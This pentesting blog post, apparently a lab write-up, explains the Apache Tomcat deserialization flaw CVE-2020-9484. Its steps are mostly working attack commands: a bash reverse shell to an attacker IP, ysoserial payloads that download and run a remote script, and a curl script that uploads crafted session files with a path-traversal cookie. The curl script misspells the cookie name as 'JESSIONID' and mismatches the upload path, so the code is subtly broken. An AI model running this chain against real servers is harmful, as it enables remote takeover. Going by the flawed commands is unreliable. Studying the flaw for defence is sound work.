---
title: Apache Tomcat Server - Deserialization of Untrusted Data (RCE)
author: Udesh
date: 2020-12-29
categories: [Pentesting]
tags: [Pentesting]
---

# Apache Tomcat Server - Deserialization of Untrusted Data (RCE)

Apache Tomcat is an open-source implementation of the Java Servlet, JavaServer Pages, Java Expression Language and WebSocket technologies. In this post we will dive into the analaysis of a vulnerability in the apache tomcat server 9.0.27. 
- [CVE - 2020-9484](https://nvd.nist.gov/vuln/detail/CVE-2020-9484 "CVE - 2020-9484")

## Introduction
The vulnerability allows a remote attacker to execute arbitrary code on the target system. The vulnerability exists due to insecure input validation when processing serialized data in uploaded files names. A remote attacker can pass specially crafted file name to the application and execute arbitrary code on the target system.

## Prerequisites
1. The attacker is able to upload a file with arbitrary content.
2. We have to know the location where the file is uploaded
3. The PersistentManager is enabled and it is using a FileStore.

## Exploit
  Tomcat provide two implementations for session managment. 
- StandardManager
- PersistentManager

When you are using PersistentManager first, it checks the session is exists in the memory, if the session does not exist in memory it will check the session on the disk. When Tomcat receives a HTTP request with a JSESSIONID cookie, it will ask the Manager to check if this session already exists. Because the attacker can control the value of JSESSIONID sent in the request, what would happen if he put something like “JSESSIONID=../../../../../../tmp/12345“?

1. Tomcat requests the Manager to check if a session with session ID“../../../../../../tmp/12345 exists.
2. It will first check if it has that session in memory.
3. It does not. But the currently running Manager is a PersistentManager, so it will also check if it has the session on disk.
4. It will check at location directory + sessionid + ".session", which evaluates to “./session/../../../../../../tmp/12345.session“
5. If the file exists, it will deserialize it and parse the session information from it.

### Step 1:

In this case, I found my file upload path in server exception. So, my file path is /opt/samples/uploads

![1.PNG]({{site.baseurl}}/assets/img/post/post7/1.PNG)

### Step 2:
We need to create our payload. In here i used simple bash reverse shell.
```bash
#! /bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.102/8888 0>&1"
```
![2.PNG]({{site.baseurl}}/assets/img/post/post7/2.PNG)

### Step 3:
Create a serialized session file to download our payload with curl. To do this, I used ysoserial jar file. download it from [here](https://github.com/frohoff/ysoserial "here").

```bash
java -jar ysoserial-master-4df2ee2bb5-1.jar CommonsCollections2 'curl http://10.10.14.102/payload.sh -o /tmp/payload.sh' > downloadPayload.session
```
Then, Create a second serialized session file to execute our payload.

```bash
java -jar ysoserial-master-4df2ee2bb5-1.jar CommonsCollections2 'bash /tmp/payload.sh' > executePayload.session
```
Finally, we have created two session files as our malicious session payload. 

![3.PNG]({{site.baseurl}}/assets/img/post/post7/3.PNG)

### Step 4: 
Now, We need to create bash script for send curl command  with cookie and our malicious files.

```bash
#! /bin/bash
curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JESSIONID=../../../opt/sample/uploads/downloadPayload' -F 'image=@downloadPayload.session'
sleep 1
curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JESSIONID=../../../opt/sample/uploads/executePayload' -F 'image=@executePayload.session'
```
Note: The server address `10.10.10.205:8080` is our tomcat server and `../../../opt/samples/uploads/` is the file upload path.

![4.PNG]({{site.baseurl}}/assets/img/post/post7/4.PNG)

### Step 5:
Finally, Setup the listner for the reverse shell and web server for the payload downloaded by the target.

![5.PNG]({{site.baseurl}}/assets/img/post/post7/5.PNG)

Now you can execute the curl bash script which we created in step 4 and get the reverse shell as the tomcat user.

## References 
- https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/
- https://github.com/frohoff/ysoserial

